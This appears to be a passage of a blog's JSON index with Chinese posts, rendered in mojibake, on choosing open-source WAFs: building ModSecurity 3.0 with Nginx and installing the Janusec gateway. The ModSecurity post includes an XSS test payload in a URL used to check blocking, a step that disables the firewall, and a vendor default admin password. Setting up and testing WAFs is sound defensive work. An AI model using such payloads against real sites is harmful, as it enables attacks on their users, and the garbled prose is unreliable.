&#39;\\.php|\\.jsp|\\.asp|\\.aspx&#39; | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;302_goto.log\necho -e &quot;\\n&quot;\n","slug":"Nginx-log-checkæ£€æµ‹å·¥å…·","date":"2022-06-15T14:30:16.000Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"æ—¥å¿—åˆ†æ,åº”æ€¥å“åº”,Nginx,å¼€æºWAFäº§å“é€‰å‹,å®‰å…¨å»ºè®¾","author_index":"Moses"},{"id":"35772fd534664d45a9bf135dc04685bc","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Nginx+ModSecurity3.0","content":"äº§å“ä¿¡æ¯ç®€ä»‹\n\n\nåç§°\nå¼€æºåè®®\nå¼€å‘è¯­è¨€\nå¼€æºæ—¶é—´\næ´»è·ƒåº¦\nä»£ç è´¨é‡\næœ€æ–°ç‰ˆæœ¬\nå‚å•†\n\n\n\nModSecurity\nBSD 3-Clause License\nLua\n2013-12-16ï¼ˆ2.7.6ï¼‰\n5.4Kâ­ï¸\nA\n2022-05-31 ï¼ˆ3.1.7ï¼‰\nTrustwave\n\n\nModSecurityä»‹ç»ModSecurityæ˜¯ä¸€ä¸ªå¼€æºçš„ã€ç”Ÿäº§çº§åˆ«çš„WAFäº§å“ï¼Œæ ¸å¿ƒç»„æˆéƒ¨åˆ†æ˜¯â€œè§„åˆ™å¼•æ“â€å’Œâ€œè§„åˆ™é›†â€ï¼Œä¸¤è€…çš„å…³ç³»æœ‰ç‚¹åƒæ€æ¯’å¼•æ“å’Œç—…æ¯’ç‰¹å¾åº“ã€‚\n\nè§„åˆ™å¼•æ“ï¼šå®ç°äº†è‡ªå®šä¹‰çš„â€SecRuleâ€è¯­è¨€ï¼Œæœ‰è‡ªå·±ç‰¹å®šçš„è¯­æ³•ã€‚ä½†â€œSecRuleâ€ä¸»è¦åŸºäºæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿˜æ˜¯ä¸å¤Ÿçµæ´»ï¼Œæ‰€ä»¥åæ¥å¼•å…¥äº†Lua,å®ç°äº†è„šæœ¬åŒ–é…ç½®ã€‚ModSecurityçš„è§„åˆ™å¼•æ“ä½¿ç”¨C++11å®ç°ï¼Œå¯ä»¥ä»GitHubä¸Šä¸‹è½½ï¼Œç„¶åé›†æˆè¿›Nginxã€‚å› ä¸ºä»–æ¯”è¾ƒåºå¤§ï¼Œç¼–è¯‘å¾ˆè´¹æ—¶é—´ï¼Œæ‰€ä»¥æœ€å¥½ç¼–è¯‘æˆåŠ¨æ€æ¨¡å—ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­ç”¨æŒ‡ä»¤load_moduleåŠ è½½\nload_module modules&#x2F;ngx_http_mod\n\nè§„åˆ™é›†ï¼šModSecurity æºç æä¾›ä¸€ä¸ªåŸºæœ¬çš„è§„åˆ™é…ç½®æ–‡ä»¶â€œmodsecurity.conf-recommendedâ€ï¼Œä½¿ç”¨å‰è¦æŠŠå®ƒçš„åç¼€æ”¹æˆâ€œconfâ€ã€‚æœ‰äº†è§„åˆ™é›†ï¼Œå°±å¯ä»¥åœ¨ Nginx é…ç½®æ–‡ä»¶é‡ŒåŠ è½½ï¼Œç„¶åå¯åŠ¨è§„åˆ™å¼•æ“ï¼šmodsecurity on;modsecurity_rules_file /path/to/modsecurity.conf;â€œmodsecurity.confâ€æ–‡ä»¶é»˜è®¤åªæœ‰æ£€æµ‹åŠŸèƒ½ï¼Œä¸æä¾›å…¥ä¾µé˜»æ–­ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢è¯¯æ€è¯¯æŠ¥ï¼ŒæŠŠâ€œSecRuleEngineâ€åé¢æ”¹æˆâ€œOnâ€å°±å¯ä»¥å¼€å¯å®Œå…¨çš„é˜²æŠ¤ï¼š#SecRuleEngine DetectionOnlySecRuleEngine Oné™¤äº†åŸºæœ¬çš„è§„åˆ™é›†ä¹‹å¤–ï¼ŒModSecurity è¿˜é¢å¤–æä¾›ä¸€ä¸ªæ›´å®Œå–„çš„è§„åˆ™é›†ï¼Œä¸ºç½‘ç«™æä¾›å…¨é¢å¯é çš„ä¿æŠ¤ã€‚è¿™ä¸ªè§„åˆ™é›†çš„å…¨åå«â€œOWASP ModSecurity æ ¸å¿ƒè§„åˆ™é›†â€CRS\n\n\nåŠŸèƒ½\nå…¼å®¹Â ModSecurityÂ (opens new window)ã€‚æ­¤åŠŸèƒ½ä»…é™æœ€æ–°çš„ Current ç‰ˆæœ¬ã€‚\nSQL æ³¨å…¥é˜²æŠ¤ï¼ˆPowered ByÂ libinjectionÂ (opens new window)ï¼‰ã€‚\nXSS æ”»å‡»é˜²æŠ¤ï¼ˆPowered ByÂ libinjectionÂ (opens new window)ï¼‰ã€‚\næ”¯æŒ IPV4 å’Œ IPV6ã€‚\næ”¯æŒå¼€å¯éªŒè¯ç ï¼ˆCAPTCHA)ï¼Œæ”¯æŒÂ hCaptchaÂ (opens new window)ã€reCAPTCHAv2Â (opens new window)å’ŒÂ reCAPTCHAv3Â (opens new window)ã€‚\næ”¯æŒè¯†åˆ«å‹å¥½çˆ¬è™«ï¼ˆå¦‚ BaiduSpiderï¼‰å¹¶è‡ªåŠ¨æ”¾è¡Œï¼ˆåŸºäº User-Agent å’Œ IP çš„è¯†åˆ«ï¼‰ã€‚æ­¤åŠŸèƒ½ä»…é™æœ€æ–°çš„ Current ç‰ˆæœ¬ã€‚\nCC é˜²å¾¡ï¼Œè¶…å‡ºé™åˆ¶åè‡ªåŠ¨æ‹‰é»‘å¯¹åº” IP ä¸€æ®µæ—¶é—´æˆ–è€…ä½¿ç”¨éªŒè¯ç åšäººæœºè¯†åˆ«ã€‚\nIP é»‘ç™½åå•ï¼ŒåŒæ—¶æ”¯æŒç±»ä¼¼Â 192.168.0.0/16Â å’ŒÂ fe80::/10ï¼Œå³æ”¯æŒç‚¹åˆ†åè¿›åˆ¶å’Œå†’å·åå…­è¿›åˆ¶è¡¨ç¤ºæ³•å’Œç½‘æ®µåˆ’åˆ†ã€‚\nPOST é»‘åå•ã€‚\nURL é»‘ç™½åå•\næŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆQuery Stringï¼‰é»‘åå•ã€‚\nUserAgent é»‘åå•ã€‚\nCookie é»‘åå•ã€‚\nReferer é»‘ç™½åå•ã€‚\n\nModSecurityåŠŸèƒ½\nSQL Injection (SQLi)ï¼šé˜»æ­¢SQLæ³¨å…¥\nCross Site Scripting (XSS)ï¼šé˜»æ­¢è·¨ç«™è„šæœ¬æ”»å‡»\nLocal File Inclusion (LFI)ï¼šé˜»æ­¢åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»\nRemote File Inclusione(RFI)ï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»\nRemote Code Execution (RCE)ï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è¿›è¡Œæ”»å‡»\nPHP Code Injectiodï¼šé˜»æ­¢PHPä»£ç æ³¨å…¥\nHTTP Protocol Violationsï¼šé˜»æ­¢è¿åHTTPåè®®çš„æ¶æ„è®¿é—®\nHTTPoxyï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹ä»£ç†æ„ŸæŸ“æ¼æ´è¿›è¡Œæ”»å‡»\nshellshockï¼šé˜»æ­¢åˆ©ç”¨Shellshockæ¼æ´è¿›è¡Œæ”»å‡»\nSession Fixationï¼šé˜»æ­¢åˆ©ç”¨Sessionä¼šè¯IDä¸å˜çš„æ¼æ´è¿›è¡Œæ”»å‡»\nScanner Detectionï¼šé˜»æ­¢é»‘å®¢æ‰«æç½‘ç«™\nMetadata&#x2F;Error Leakagesï¼šé˜»æ­¢æºä»£ç &#x2F;é”™è¯¯ä¿¡æ¯æ³„éœ²\nProject Honey Pot Blacklistï¼šèœœç½é¡¹ç›®é»‘åå•\nGeoIP Country Blockingï¼šæ ¹æ®åˆ¤æ–­IPåœ°å€å½’å±åœ°æ¥è¿›è¡ŒIPé˜»æ–­\n\nå‡†å¤‡ç¯å¢ƒ\næ“ä½œç³»ç»Ÿï¼šCentOS-7-x86_64-DVD-1810.iso\nModSecurityï¼š3.0\nNginxï¼š1.16.1\nè™šæ‹Ÿæœºï¼švwareFusion12.2.1 æ¡¥æ¥\n\nå®‰è£…æ“ä½œç³»ç»Ÿä¾èµ–yum install -y git wget epel-release\nyum install -y gcc-c++ flex bison yajl yajl-devel curl-devel curl GeoIP-devel doxygen zlib-devel pcre-devel lmdb-devel libxml2-devel ssdeep-devel lua-devel libtool autoconf automake\nå®‰è£…ModSecuritycd &#x2F;usr&#x2F;local\ngit clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity\ncd ModSecurity\ngit checkout -b v3&#x2F;master origin&#x2F;v3&#x2F;master\ngit submodule init\ngit submodule update\nsh build.sh\n.&#x2F;configure\n# è¾“å‡º\nModSecurity - v3.0.7-1-g9755088 for Linux\n\n Mandatory dependencies\n   + libInjection                                  ....v3.9.2-46-gbfba51f\n   + SecLang tests                                 ....a3d4405\n\n Optional dependencies\n   + GeoIP&#x2F;MaxMind                                 ....found\n      * (GeoIP) v1.5.0\n         -lGeoIP  , -I&#x2F;usr&#x2F;include&#x2F;\n   + LibCURL                                       ....found v7.29.0\n      -lcurl  ,  -DWITH_CURL\n   + YAJL                                          ....found v2.0.4\n      -lyajl  , -DWITH_YAJL\n   + LMDB                                          ....disabled\n   + LibXML2                                       ....found v2.9.1\n      -lxml2 -lz -lm -ldl, -I&#x2F;usr&#x2F;include&#x2F;libxml2 -DWITH_LIBXML2\n   + SSDEEP                                        ....found\n      -lfuzzy -L&#x2F;usr&#x2F;lib64&#x2F;, -DWITH_SSDEEP -I&#x2F;usr&#x2F;include\n   + LUA                                           ....found v501\n      -llua-5.1 -L&#x2F;usr&#x2F;lib64&#x2F;, -DWITH_LUA -DWITH_LUA_5_1 -I&#x2F;usr&#x2F;include\n   + PCRE2                                          ....not found\n\n Other Options\n   + Test Utilities                                ....enabled\n   + SecDebugLog                                   ....enabled\n   + afl fuzzer                                    ....disabled\n   + library examples                              ....enabled\n   + Building parser                               ....disabled\n   + Treating pm operations as critical section    ....disabled\nmake\nmake install\nå®‰è£…Nginxä¸ModSecurity-nginxcd &#x2F;usr&#x2F;local\ngit clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity-nginx\nwget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.16.1.tar.gz\ntar -xvzf nginx-1.16.1.tar.gz\ncd &#x2F;usr&#x2F;local&#x2F;nginx-1.16.1\n.&#x2F;configure --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;ModSecurity-nginx\nmake\nmake install\n\néªŒè¯å¯åŠ¨Nginx\n&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx\néªŒè¯NginxæœåŠ¡\n[root@localhost sbin]# curl -i http:&#x2F;&#x2F;127.0.0.1\nHTTP&#x2F;1.1 200 OK\nServer: nginx&#x2F;1.16.1\nDate: Thu, 09 Jun 2022 08:24:59 GMT\nContent-Type: text&#x2F;html\nContent-Length: 612\nLast-Modified: Thu, 09 Jun 2022 08:23:04 GMT\nConnection: keep-alive\nETag: &quot;62a1ade8-264&quot;\nAccept-Ranges: bytes\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;\n&lt;style&gt;\n    body &#123;\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    &#125;\n&lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;&#x2F;h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;&#x2F;p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.org&#x2F;&quot;&gt;nginx.org&lt;&#x2F;a&gt;.&lt;br&#x2F;&gt;\nCommercial support is available at\n&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.com&#x2F;&quot;&gt;nginx.com&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\nPSï¼šæµè§ˆå™¨è®¿é—®å¤±è´¥ï¼Œä¸´æ—¶å…³é—­é˜²ç«å¢™éªŒè¯\n[root@localhost sbin] systemctl stop firewalld.service\næµè§ˆå™¨è®¿é—®\né…ç½®\nåˆ›å»ºç”¨äºå­˜æ”¾é…ç½®çš„æ–‡ä»¶å¤¹[root@localhost conf]# mkdir &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity\nå¤åˆ¶å¹¶é‡å‘½åé…ç½®æ–‡ä»¶[root@localhost conf] cp &#x2F;usr&#x2F;local&#x2F;ModSecurity&#x2F;modsecurity.conf-recommended &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# é‡å‘½åé…ç½®æ–‡ä»¶\n[root@localhost] cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F; &amp;&amp; rename modsecurity.conf-recommended modsecurity.conf *\n[root@localhost modsecurity] cp &#x2F;usr&#x2F;local&#x2F;ModSecurity&#x2F;unicode.mapping &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\nä¸‹è½½è§„åˆ™æ–‡ä»¶å‹ç¼©åŒ…# ä¸‹è½½è§„åˆ™åŒ…\n[root@localhost local] wget http:&#x2F;&#x2F;www.modsecurity.cn&#x2F;download&#x2F;corerule&#x2F;owasp-modsecurity-crs-3.3-dev.zip\n# è§£å‹\n[root@localhost local] unzip owasp-modsecurity-crs-3.3-dev.zip\n# å¤åˆ¶crs-setup.conf.example\n[root@localhost owasp-modsecurity-crs-3.3-dev] cp crs-setup.conf.example &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# é‡å‘½åæ–‡ä»¶\n[root@localhost] cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F; &amp;&amp; rename modsecurity.conf.example crs-setup.conf *\n# å¤åˆ¶ruleæ–‡ä»¶å¤¹\n[root@localhost owasp-modsecurity-crs-3.3-dev] cp -r rules &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# ä¿®æ”¹æ–‡ä»¶å,å¯ä»¥å°†è‡ªå·±å†™çš„è§„åˆ™æ”¾åœ¨999 900è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­\n[root@localhost rules] rename RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf *\n[root@localhost rules] rename REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf *\nç¼–è¾‘nginx.confåœ¨httpæˆ–serverèŠ‚ç‚¹ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹åœ¨httpèŠ‚ç‚¹æ·»åŠ è¡¨ç¤ºå…¨å±€é…ç½®ï¼Œåœ¨serverèŠ‚ç‚¹æ·»åŠ è¡¨ç¤ºä¸ºæŒ‡å®šç½‘ç«™é…ç½®ï¼šmodsecurity on;\nmodsecurity_rules_file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;modsecurity.conf;\nç¼–è¾‘modsecurity.confvim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;modsecurity.conf\n# SecRuleEngine DetectionOnlyæ”¹ä¸ºSecRuleEngine On\n# æ·»åŠ ä¸€ä¸‹å†…å®¹\nInclude &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;crs-setup.conf\nInclude &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;*.conf\né‡æ–°åŠ è½½Nginx&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload\næ¨¡æ‹Ÿæ”»å‡»æµ‹è¯• http://nginx.test/?param=%22%3E%3Cscript%3Ealert(1);%3C/script%3E\n\nè¿›é˜¶NginxåŸºäºIPçš„å®‰å…¨é˜²æŠ¤ç­–ç•¥ç”±äºè™šæ‹Ÿæœºéƒ¨ç½²çš„Nginxï¼ŒNginxè®¿é—®æ—¥å¿—IPä¸ºè™šæ‹Ÿæœºç½‘å…³IP172.16.244.1\nNginxè·å–çœŸå®æºIPtodo\nNginxç¦æ­¢å›½å¤–IPæµ‹è¯•æŒ‚ä»£ç†è®¿é—®ä¸ç»è¿‡äº’è”ç½‘ï¼Œæ—¥å¿—åªè®°å½•è™šæ‹Ÿæœºç½‘å…³IPã€‚å±€åŸŸç½‘è®¿é—®ä¸åˆ°è™šæ‹ŸæœºIPã€‚TODO\n\n é€šè¿‡colabåˆ›å»ºVPSéƒ¨ç½²Nginx âœ… 2022-06-10 ğŸ’€è¡Œä¸é€š\n\nSSH VNCFailed to download https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz Â· Issue #31 Â· hackingguy/Bug-Hunting-Colab Â· GitHub\nChrome Remote DesktopGoogle Colabå¸¸è§é—®é¢˜Colab ä¸­çš„èµ„æºå°†ä¼˜å…ˆæä¾›ç»™äº¤äº’å¼ç”¨ä¾‹ã€‚æˆ‘ä»¬ç¦æ­¢å„ç§æ¶‰åŠæ‰¹é‡è®¡ç®—ã€ä¼šå¯¹ä»–äººé€ æˆè´Ÿé¢å½±å“ï¼Œæˆ–è¯•å›¾è§„é¿æˆ‘ä»¬çš„æ”¿ç­–çš„æ“ä½œã€‚Colab è¿è¡Œæ—¶ä¸­ä¸å…è®¸æ‰§è¡Œä¸‹åˆ—æ“ä½œï¼š\n\næ–‡ä»¶æ‰˜ç®¡ã€åª’ä½“ä¼ é€æˆ–æä¾›å…¶ä»–ä¸ Colab çš„äº¤äº’å¼è®¡ç®—æ— å…³çš„ç½‘ç»œæœåŠ¡\nä¸‹è½½ç§å­æ–‡ä»¶æˆ–è¿›è¡Œç‚¹å¯¹ç‚¹æ–‡ä»¶å…±äº«\nä½¿ç”¨è¿œç¨‹æ¡Œé¢æˆ– SSH\nè¿æ¥åˆ°è¿œç¨‹ä»£ç†\nåŠ å¯†è´§å¸æŒ–çŸ¿\nè¿è¡Œæ‹’ç»æœåŠ¡æ”»å‡»\nç ´è§£å¯†ç \nåˆ©ç”¨å¤šä¸ªå¸å·ç»•è¿‡è®¿é—®æƒé™æˆ–èµ„æºä½¿ç”¨æƒ…å†µé™åˆ¶\nåˆ›å»ºæ·±åº¦ä¼ªé€ å†…å®¹\n\nYouTubeå‚è€ƒè§†é¢‘\nåˆ›å»ºDEMOåº”ç”¨[[RASP-JRASP#0x06æµ‹è¯•ç”¨ä¾‹]]\n","slug":"å¼€æºWAFé€‰å‹-Nginx+ModSecurity3.0","date":"2022-06-09T06:39:16.000Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,å®‰å…¨å»ºè®¾,ModSecurity","author_index":"Moses"},{"id":"46d38e362d8b157bea9e251631b6d0f7","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Janusec","content":"äº§å“ä¿¡æ¯ç®€ä»‹\n\n\nåç§°\nå¼€æºåè®®\nå¼€å‘è¯­è¨€\nå¼€æºæ—¶é—´\næ´»è·ƒåº¦\nä»£ç è´¨é‡\næœ€æ–°ç‰ˆæœ¬\nå‚å•†\n\n\n\nJanusec\nGNUÂ AGPLv3\nGo\n2021-04-5ï¼ˆ1.0.0ï¼‰\n923â­ï¸\n\n2022-04-03 ï¼ˆ1.2.9ï¼‰\nä¸ªäººå¼€å‘è€…\n\n\näº§å“æè¿°Janusecåº”ç”¨ç½‘å…³ï¼Œä¸€ç§é€‚ç”¨äºå„ç§åœºæ™¯ï¼ˆå…¬æœ‰äº‘ã€ç§æœ‰äº‘ã€ä¼ ç»ŸIDCç­‰ï¼‰çš„åº”ç”¨å®‰å…¨è§£å†³æ–¹æ¡ˆï¼Œæä¾›WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰ã€CCé˜²æŠ¤ã€èº«ä»½è®¤è¯ã€å®‰å…¨è¿ç»´ã€Webè·¯ç”±ã€è´Ÿè½½å‡è¡¡ã€è‡ªåŠ¨åŒ–è¯ä¹¦ç­‰åŠŸèƒ½ï¼Œå¯ç”¨äºæ„å»ºå®‰å…¨çš„ã€å¯æ‰©å±•çš„åº”ç”¨ã€‚\nåŠŸèƒ½\nWAF (Web Application Firewall, Webåº”ç”¨é˜²ç«å¢™ï¼Œå¤©ç„¶æ”¯æŒHTTPSä¸”ä¸éœ€è¦Agent )\nCCé˜²æŠ¤ï¼ˆå¤šé“é˜²çº¿ï¼‰\nç»Ÿä¸€çš„WebåŒ–ç®¡ç†\nè¯ä¹¦åŠ å¯†ä¿æŠ¤\nè´Ÿè½½å‡è¡¡ï¼ˆå¯æ‰©å±•çš„éƒ¨ç½²æ¶æ„ï¼‰\nSQLæ³¨å…¥\nè·¨ç«™è„šæœ¬\næ•æ„Ÿæ•°æ®æ³„éœ²\nCCæ”»å‡»\né˜»æ–­ï¼ˆBlockï¼‰ã€éªŒè¯ç ï¼ˆCaptchaï¼‰ç­‰å¤šç§ç­–ç•¥\næ”¯æŒå¤šä¸ªæ£€æŸ¥ç‚¹çš„ç»„åˆç­–ç•¥\n\nè®©ç®¡ç†æ›´ç®€å•\nç»Ÿä¸€çš„WebåŒ–ç®¡ç†ä¸­å¿ƒ\n\næ¶æ„å¯æ‰©å±•\nå¤šç½‘å…³èŠ‚ç‚¹æ”¯æŒ\nè‡ªåŠ¨åŒ–ç­–ç•¥åŒæ­¥\n\nè¯ä¹¦ä¿æŠ¤\nç§é’¥åŠ å¯†å­˜å‚¨\nåªåœ¨å†…å­˜ä½¿ç”¨\n\nå®‰è£…quick-start docker\ndownload imagesdocker pull registry.cn-shenzhen.aliyuncs.com&#x2F;janusec&#x2F;janusec:1.2.3\n# æµ‹è¯•å®¹å™¨ç‰ˆæœ¬1.2.3 æœ€æ–°ç‰ˆæœ¬ä¸º1.2.9\nrundocker run -d --privileged&#x3D;true --restart&#x3D;always -p 80:80 -p 443:443 -p 9080:9080 -p 9443:9443 registry.cn-shenzhen.aliyuncs.com&#x2F;janusec&#x2F;janusec:1.2.3 &#x2F;sbin&#x2F;init\nä¿®æ”¹æµ‹è¯•åŸŸåä½¿ç”¨[[å¼€å‘æµ‹è¯•å·¥å…·-SwitchHosts]]æ·»åŠ æµ‹è¯•åŸŸå#WAF-test\n10.9.95.230 waf.com\nä¿®æ”¹å¯†ç åˆå§‹ç”¨æˆ·å¯†ç ï¼š\n\n\nadmin \nJ@nusec123 ï¼ˆç™»å½•åä¼šæç¤ºä¿®æ”¹ï¼‰\n\n\nä½¿ç”¨å‚è§æ–‡æ¡£ä»‹ç»\n\nä¸»æœºéƒ¨ç½²éœ€æ±‚\n\n\nèŠ‚ç‚¹\næ“ä½œç³»ç»Ÿ\næ•°æ®åº“\n\n\n\nä¸»èŠ‚ç‚¹\nDebian 9&#x2F;10&#x2F;11+, CentOS&#x2F;RHEL 7&#x2F;8+, é¦–é€‰Debian 10, x86_64, ä½¿ç”¨ systemdå’Œnftables\nPostgreSQL 10&#x2F;11&#x2F;12+\n\n\nå‰¯æœ¬èŠ‚ç‚¹\nDebian 9&#x2F;10&#x2F;11+, CentOS&#x2F;RHEL 7&#x2F;8+, é¦–é€‰Debian 10, x86_64, ä½¿ç”¨ systemdå’Œnftables\nä¸éœ€è¦\n\n\nå‡†å¤‡ä¸»æœºé˜²ç«å¢™nftablesnftablesç”¨äºæ‹¦æˆªCCæ”»å‡»ï¼Œå‡è½»åº”ç”¨ç½‘å…³å‹åŠ›ã€‚CentOS 7é»˜è®¤æ²¡æœ‰å®‰è£…nftablesï¼Œéœ€è¦æ‰‹å·¥å®‰è£…å¹¶å¯åŠ¨ï¼š\nyum -y install nftables  \nsystemctl enable nftables  \nsystemctl start nftables\n# æŸ¥çœ‹è§„åˆ™\nnft list ruleset\nä¸‹è½½cd ~  \nwgetÂ &#96;https:&#x2F;&#x2F;www.janusec.com&#x2F;download&#x2F;janusec-1.2.9-amd64.tar.gz&#96;  tar zxf .&#x2F;janusec-1.2.9-amd64.tar.gz\nå®‰è£…è¯·åˆ‡æ¢åˆ°rootç”¨æˆ·å¹¶è¿è¡Œ install.sh , janusecåº”ç”¨ç½‘å…³å°†å®‰è£…åœ¨ç›®å½•ï¼šÂ /usr/local/janusec/\nsu  \ncd janusec-1.2.x-amd64  \n.&#x2F;install.sh\né€‰æ‹©Â 1. Primary Node, ç„¶åå®‰è£…ç¨‹åºä¼š:\n\nå°†æ‰€éœ€æ–‡ä»¶å¤åˆ¶åˆ°Â /usr/local/janusec/\nå°†æœåŠ¡é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°ç³»ç»ŸæœåŠ¡ç›®å½•\nå°†Janusecåº”ç”¨ç½‘å…³æœåŠ¡è®¾ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨ï¼Œä½†é¦–æ¬¡å®‰è£…æ—¶ä¸ä¼šå¯åŠ¨ï¼Œéœ€è¦åœ¨é…ç½®å®Œæˆåæ‰‹å·¥å¯åŠ¨ä¸€æ¬¡.\n\né…ç½®PostgreSQLæ²¡æœ‰åŒ…å«åœ¨å‘å¸ƒåŒ…ä¸­ï¼Œéœ€è¦è‡ªè¡Œå‡†å¤‡PostgreSQLæ•°æ®åº“ã€æ•°æ®åº“ã€è´¦å·ï¼Œå¯å‚è€ƒè¿ç»´ç®¡ç†ä¸­çš„PostgreSQLå®‰è£…ã€‚ç°åœ¨æˆ‘ä»¬å‡è®¾æ‚¨å·²ç»å®‰è£…å¥½äº†PostgreSQLï¼Œä¸”æ•°æ®åº“å·²åˆ›å»ºï¼Œç”¨æˆ·åå’Œå£ä»¤å·²å‡†å¤‡å¥½ã€‚ç„¶åç¼–è¾‘Â /usr/local/janusec/config.jsonÂ :\nä¸»èŠ‚ç‚¹ (ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¿…é€‰)å¯å‚è€ƒé…ç½®æ–‡ä»¶è¯´æ˜ï¼Œå…¶ä¸­ï¼š\nâ€œnode_roleâ€: â€œprimaryâ€ ( å›ºå®šä¸ºÂ &#96;primary&#96;Â )\nå‰¯æœ¬èŠ‚ç‚¹(å¯é€‰)é€šå¸¸å¤šä¸ªå°å‹åº”ç”¨åªä½¿ç”¨ä¸€ä¸ªä¸»èŠ‚ç‚¹å°±å¤Ÿäº†ã€‚å½“æµé‡å¢é•¿åï¼Œå¯ä½¿ç”¨å‰¯æœ¬èŠ‚ç‚¹æ‰©å±•ï¼Œéœ€è¦é…åˆæ‚¨è‡ªå·±çš„GSLBï¼ˆå…¨çƒæœåŠ¡å™¨è´Ÿè½½å‡è¡¡ï¼‰æˆ–æ”¯æŒåˆ†åŒºè§£æçš„DNSæ¥å®ç°ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒåœ°åŒºçš„ç”¨æˆ·ï¼Œä¼šè¿æ¥åˆ°ä¸åŒçš„ç½‘å…³èŠ‚ç‚¹ï¼‰ã€‚\nå¯å‚è€ƒé…ç½®æ–‡ä»¶è¯´æ˜ï¼Œå…¶ä¸­:\n\n\n\n\n\n\n\n\n\nâ€œnode_roleâ€: â€œreplicaâ€ ( å›ºå®šä¸ºÂ replicaÂ )\nå¹¶é…ç½®â€replica_nodeâ€ä¸­çš„å†…å®¹:\n\n\n\n\n\n\n\n\n\nâ€œnode_keyâ€: â€œä»ç®¡ç†åå°èŠ‚ç‚¹ç®¡ç†ä¸­å¤åˆ¶è¿‡æ¥â€,â€œsync_addrâ€: â€œhttps://gateway.primary_node.com:9443&#x2F;janusec-admin&#x2F;apiâ€\nè¯´æ˜ï¼š\n\nå¦‚æœä½¿ç”¨äº†å‰¯æœ¬èŠ‚ç‚¹ï¼Œè¯·ä¸ºä¸»èŠ‚ç‚¹å•ç‹¬ç”³è¯·ä¸€ä¸ªåŸŸå(ä¾‹å¦‚gateway.primary_node.comï¼Œç”¨äºå‰¯æœ¬èŠ‚ç‚¹è·å–é…ç½®æ›´æ–°ï¼Œè¯¥åŸŸååªæŒ‡å‘ä¸»èŠ‚ç‚¹)ï¼Œå¹¶ä¸”é…ç½®ä¸€ä¸ªåº”ç”¨(Application)ï¼ŒDestinationå¯é…ç½®ä¸º127.0.0.1:9999 ï¼ˆå®é™…ä¸ä½¿ç”¨ï¼‰ã€‚\nå¦‚æœâ€primary_nodeâ€ - â€œadminâ€ - â€œlistenâ€ ä¸ºfalseï¼Œâ€œsync_addrâ€ä¸­è¯·å‹¿åŒ…å«å†’å·å’Œç«¯å£å·ï¼Œå¦‚â€https://gateway.primary_node.com/janusec-admin/apiâ€\n\nå¯åŠ¨systemctl start 